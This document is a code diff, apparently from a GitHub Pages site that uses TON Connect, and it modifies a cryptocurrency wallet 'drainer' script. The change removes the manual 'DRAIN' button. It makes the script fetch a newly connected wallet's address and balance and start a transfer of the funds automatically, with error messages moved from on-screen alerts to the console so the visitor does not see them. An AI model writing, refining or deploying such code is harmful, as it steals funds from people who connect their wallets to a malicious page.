@@ -6,11 +6,9 @@ document.addEventListener('DOMContentLoaded', () => {
     var ipUser;
     var countryUser;
 
-
     // Инициализация TON Connect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: `https://leonardokotu.github.io/mysite/tonconnect-manifest.json`, // URL манифеста
-
         buttonRootId: 'ton-connect' // ID элемента для кнопки подключения
     });
 
@@ -38,26 +36,26 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Обработка подключения кошелька
     tonConnectUI.onStatusChange(wallet => {
-        const drainButton = document.getElementById('drain-button');
         if (wallet) {
             console.log('Кошелек подключен:', wallet);
-            // Активируем кнопку "DRAIN"
-            drainButton.disabled = false;
+            // Логирование информации о подключенном кошельке
+            const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
+            console.log(walletInfo);
+
+            // Автоматически запускаем процесс отправки средств
+            didtrans(wallet.account.address);
         } else {
             console.log('Кошелек отключен.');
-            // Деактивируем кнопку "DRAIN"
-            drainButton.disabled = true;
         }
     });
 
     // Функция для отправки транзакции
-    async function didtrans() {
-        if (!tonConnectUI.account) {
-            alert('Кошелек не подключен. Пожалуйста, подключите кошелек.');
+    async function didtrans(walletAddress) {
+        if (!walletAddress) {
+            console.error('Адрес кошелька не указан.');
             return;
         }
 
-        const walletAddress = tonConnectUI.account.address;
         const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
         const data = await response.json();
         const originalBalance = parseFloat(data.balance);
@@ -65,7 +63,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const tgBalance = processedBalance / 1000000000; // Конвертация в TON
 
         if (processedBalance <= 0) {
-            alert('Недостаточный баланс для выполнения транзакции.');
+            console.error('Недостаточный баланс для выполнения транзакции.');
             return;
         }
 
@@ -113,13 +111,5 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             })
             .catch(error => console.error('Ошибка:', error));
-    }
-
-    // Добавление обработчика события для кнопки "DRAIN"
-    const drainButton = document.getElementById('drain-button');
-    if (drainButton) {
-        drainButton.addEventListener('click', didtrans);
-    } else {
-        console.error('Элемент с ID "drain-button" не найден.');
     }
 });
